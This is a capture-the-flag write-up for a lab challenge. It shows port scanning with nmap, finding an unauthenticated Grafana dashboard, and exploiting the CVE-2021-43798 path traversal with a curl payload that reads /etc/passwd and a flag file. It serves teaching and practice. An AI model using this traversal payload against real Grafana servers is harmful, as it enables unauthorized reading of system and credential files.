# Blindspot Write-up

## Challenge Overview
The `Blindspot` challenge starts with a website that shows only a blank placeholder page. The real vulnerability is hidden on a different port that you need to find it first, then exploit it to get the flag.

---

## Step 1: Scan for Hidden Services

When you visit `http://<target-ip>:80`, you only see a dummy HTML page. This dead-end is intentional—the vulnerability is **not** on port 80.

Use `nmap` to scan all ports and find what else is running:

```bash
nmap -p- --open -sV <target-ip>
```

This will reveal a service running on port **8081**. The output will show something like:
```
8081/tcp open  http    Grafana
```

This is your real target.

---

## Step 2: Identify Grafana and Its Version

Navigate to `http://<target-ip>:8081` in your browser. You'll see the Grafana dashboard displayed directly with **no login page is required**. This is the vulnerability where Grafana is exposed without authentication enabled.

**Find the version number:** Look at the page source or the bottom-right corner of the Grafana interface—the version is usually displayed there (for example, `7.5.3`).

**Why does version matter?** Older versions have known security vulnerabilities. Searching the version online will show you what exploits are available.

---

## Step 3: Check for Known Vulnerabilities (CVE-2021-43798)

The Grafana version running on this challenge is vulnerable to **CVE-2021-43798**, a **path traversal vulnerability**.

**What this means:**
- Path traversal is a vulnerability where you manipulate the file path in a URL to read files outside the intended directory.
- The vulnerability exists in Grafana's plugin handling code.
- **Important:** You don't need to be logged in to exploit this—it works on unauthenticated requests.

---

## Exploring the Grafana Instance

Accessing `http://<target-ip>:8081` displays the Grafana dashboard directly—no authentication is configured. The **Grafana version number** is clearly displayed. A quick search of that version against public CVE databases reveals it's outdated and vulnerable.

> **Note:** The fact that Grafana is exposed without authentication makes it easier to exploit. Identifying the version is crucial during reconnaissance; it lets us find specific vulnerabilities affecting that release.

---

## Step 4: Exploit the Vulnerability

The vulnerable endpoint is:
```
/public/plugins/<plugin-name>/../../../../../../../../etc/passwd
```

The key insight:
- Grafana has a plugin system and stores plugins in `/public/plugins/`
- The code doesn't properly validate the file path you request
- Using `../` repeatedly lets you escape the plugin directory and read any file on the system

**To read the flag**, use `curl` with the `--path-as-is` flag (this prevents curl from normalizing the path).

> **Finding the right plugin name:** the exploit requires a valid plugin directory. In the challenge you don’t know which plugins are installed, so you guess common names one by one until one returns a response. We eventually tried `alertlist`, which worked.

```bash
curl --path-as-is "http://<target-ip>:8081/public/plugins/alertlist/../../../../../../../../flag.txt"
```

**Note:** `alertlist` is a real Grafana plugin and it's a safe guess that's likely to exist on the system.

**Output:**
```
SEASIDES{gr4f4n4_p4th_tr4v3rs4l}
```

---

## Conclusion

This challenge demonstrates the importance of checking non-standard ports and verifying access controls. A publicly accessible dashboard with an outdated Grafana version provided a trivial path traversal that yielded the flag. Always lock down monitoring interfaces and keep software versions up to date.

